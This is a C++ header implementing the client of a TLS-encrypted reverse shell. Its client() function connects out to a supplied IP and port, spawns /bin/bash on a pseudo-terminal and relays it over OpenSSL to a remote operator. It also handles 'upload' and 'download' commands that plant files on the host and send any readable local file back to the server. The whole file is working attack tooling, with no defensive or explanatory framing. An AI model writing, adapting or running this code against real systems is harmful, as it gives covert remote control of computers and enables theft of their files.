#ifndef ENCRYPTED_REV_SHELL_CLIENT_UTILS_H
#define ENCRYPTED_REV_SHELL_CLIENT_UTILS_H

#include "utils.h"

inline fileTransfer c_handleDownloadRequest(SSL* ssl) {

    char pathToRead[256];
    char pathToWrite[256];

    int pathToReadBytes = SSL_read(ssl, pathToRead, sizeof(pathToRead) - 1);
    pathToRead[pathToReadBytes] = '\0'; // null byte to prevent non required data being added to the buffer

    int pathToWriteBytes = SSL_read(ssl, pathToWrite, sizeof(pathToWrite) - 1);
    pathToWrite[pathToWriteBytes] = '\0'; // null byte to prevent non required data being added to the buffer

    // set up the config
    fileTransfer transferCfg;
    transferCfg.type = "download";
    transferCfg.pathToWrite = std::string(pathToWrite);
    transferCfg.pathToRead = std::string(pathToRead);

    return transferCfg;
}

inline void client(const std::string &ipAddr, unsigned int portNum) {

    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);

    if (clientSocket < 0) {
        std::cout << "Failed to create client socket!" << std::endl;
        exit(1);
    }

    // socket info
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(portNum);
    serverAddr.sin_addr.s_addr = inet_addr(ipAddr.c_str());

    if (connect(clientSocket, reinterpret_cast<struct sockaddr *>(&serverAddr),sizeof(serverAddr)) < 0) {
        std::cout << "Failed to connect to server!" << std::endl;
        close(clientSocket);
        exit(-1);
    }

    // as of openssl 1.1.0, openssl can allocate all resources required (error strings, etc)
    OPENSSL_init_ssl(0, nullptr);

    SSL_CTX* ctx = createSSLCtx();
    SSL* ssl = SSL_new(ctx);
    //https://docs.openssl.org/master/man3/SSL_set_fd/
    // "bind" to socket, or set ssl fd to socket input/output
    SSL_set_fd(ssl, clientSocket);

    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
    }
    else {
        std::cout << "[+] Connected to server with TLS!" << std::endl;
    }

    int masterFd;
    pid_t childPid = forkpty(&masterFd, nullptr, nullptr, nullptr);

    if (childPid < 0) {
        safeShutdown("[!] Fork failed to create! ", clientSocket, masterFd, ssl, ctx);
    }
    if (childPid == 0) {
        execl("/bin/bash", "bash", nullptr);
        safeShutdown("[!] Execl failed!", clientSocket, masterFd, ssl, ctx);
    }

    fd_set fds;
    char ttyBuffer[4096];
    while (true) {
        FD_ZERO(&fds);
        FD_SET(clientSocket, &fds);
        FD_SET(masterFd, &fds);

        int maxFd = std::max(clientSocket, masterFd) + 1;
        int activity = select(maxFd, &fds, nullptr, nullptr, nullptr);
        if (activity < 0 ) {
            break;
        }

        // from server to tty
        if (FD_ISSET(clientSocket, &fds)) {
            ssize_t bytesReceived = SSL_read(ssl, ttyBuffer, sizeof(ttyBuffer));
            if (bytesReceived <= 0) {
                std::cout << "[!] Server Disconnected! " << std::endl;
                break;
            }

            // server has requested an upload, so we dont send the data coming in to
            // the masterfD, infact we upload the file to the server
            // we should be expecting a second incoming connection
            std::string tmpStr(ttyBuffer, bytesReceived);
            fileTransfer transferCfg;

            if (tmpStr.find("upload") != std::string::npos ) {

                char pathToWrite[4096];
                SSL_read(ssl, &pathToWrite, sizeof(pathToWrite));
                transferCfg.pathToWrite = std::string(pathToWrite);

                std::vector<std::byte> incomingFile = handleIncomingFile(ssl);

                if (!incomingFile.empty()) {
                    writeBytesToFile(incomingFile, transferCfg.pathToWrite);
                }
                else {
                    std::cout << "[!] An error occured in transmission!" << std::endl;
                }
            }
            else if (tmpStr.find("download") != std::string::npos) {

                transferCfg = c_handleDownloadRequest(ssl);

                std::vector<std::byte> fileBuffer = readFileAsByteVector(transferCfg.pathToRead);

                if (fileBuffer.empty()) {
                    const char* err = "[!] Download Failed: Failed To Read File / File Does Not Exist!";
                    SSL_write(ssl, err, strlen(err));
                }
                else {
                    prepareAndUpload(ssl, fileBuffer, transferCfg.type, transferCfg.pathToWrite);
                }


            }
            else {
                // ssl not required here as were just writing to local shell
                write(masterFd, ttyBuffer, bytesReceived);
            }

        }

        // from tty to server
        if (FD_ISSET(masterFd, &fds)) {
            // read input from local chell
            ssize_t n = read(masterFd, ttyBuffer, sizeof(ttyBuffer));
            // check we actually have some data
            std::string clientTtyBufferStr(ttyBuffer, n);
            // check were processing a download and if so don't send the tty buffer
            // as this will interfere with the download process
            if (n > 0 && clientTtyBufferStr.find("download") == std::string::npos) {
                // use ssl to send it to the server
                SSL_write(ssl, ttyBuffer, n);
            }
        }
    }

    SSL_free(ssl);
    SSL_CTX_free(ctx);
    close(clientSocket);
    close(masterFd);
    wait(nullptr);
}




#endif //ENCRYPTED_REV_SHELL_CLIENT_UTILS_H